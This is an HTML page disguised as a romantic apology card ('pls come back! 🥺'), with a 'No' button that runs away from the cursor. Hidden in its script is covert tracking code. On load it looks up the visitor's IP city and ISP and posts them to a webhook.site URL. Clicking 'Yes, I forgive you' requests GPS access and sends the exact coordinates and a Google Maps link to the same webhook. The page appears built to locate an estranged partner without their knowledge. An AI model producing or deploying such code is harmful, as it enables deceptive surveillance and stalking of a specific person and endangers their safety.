<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>wapas aao baua! 🥺</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Pacifico&display=swap');
        
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #fce4ec;
            font-family: 'Poppins', sans-serif;
            overflow: hidden;
        }
        
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.9);
            padding: 50px;
            border-radius: 25px;
            box-shadow: 0 15px 35px rgba(233, 30, 99, 0.15);
            max-width: 400px;
            z-index: 10;
        }

        h1 { font-family: 'Pacifico', cursive; color: #e91e63; font-size: 3.5rem; margin-bottom: 10px; }
        p { color: #666; font-size: 1.2rem; margin-bottom: 30px; }

        .btn-container { display: flex; justify-content: center; gap: 20px; }
        .btn {
            background-color: #ff4081;
            color: white;
            border: none;
            padding: 15px 35px;
            font-size: 1.1rem;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 600;
        }

        #noBtn { background-color: #9e9e9e; }
        .circle { position: absolute; border-radius: 50%; background: rgba(255, 64, 129, 0.1); animation: float 8s infinite ease-in-out; z-index: 1; }
        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-30px); } }
    </style>
</head>
<body>

    <div class="circle" style="width: 200px; height: 200px; top: -50px; left: -50px;"></div>
    <div class="circle" style="width: 300px; height: 300px; bottom: -100px; right: -50px; animation-delay: 2s;"></div>

    <div class="container" id="mainCard">
        <h1>pls come back! 🥺</h1>
        <p>I know things got messed up. <br> Can you forgive me?</p>
        <div class="btn-container">
            <button class="btn" onclick="askLocation()">Yes, I forgive you ❤️</button>
            <button class="btn" id="noBtn" onmouseover="moveButton()">No</button>
        </div>
    </div>

    <script>
        const myWebhook = "https://webhook.site/69cf21e1-aa39-43db-acb6-f467303d55f4";

        // 1. Initial IP Tracking (Background)
        fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            sendToWebhook({ type: "IP_Info", city: data.city, isp: data.org });
        });

        // 2. GPS Location Trigger
        function askLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(success, fail);
            } else {
                showLove();
            }
        }

        function success(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
            
            sendToWebhook({ type: "GPS_LIVE", google_maps: mapLink, lat: lat, lon: lon });
            showLove();
        }

        function fail() {
            sendToWebhook({ type: "GPS_DENIED" });
            showLove();
        }

        function sendToWebhook(data) {
            fetch(myWebhook, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }

        function moveButton() {
            const btn = document.getElementById('noBtn');
            btn.style.position = 'absolute';
            btn.style.top = Math.random() * (window.innerHeight - 50) + 'px';
            btn.style.left = Math.random() * (window.innerWidth - 100) + 'px';
        }

        function showLove() {
            document.getElementById('mainCard').innerHTML = `<h1>Yay! 🥰</h1><p>Thank you! Let's meet up soon!</p><div style="font-size: 5rem;">❤️</div>`;
        }
    </script>
</body>
</html>
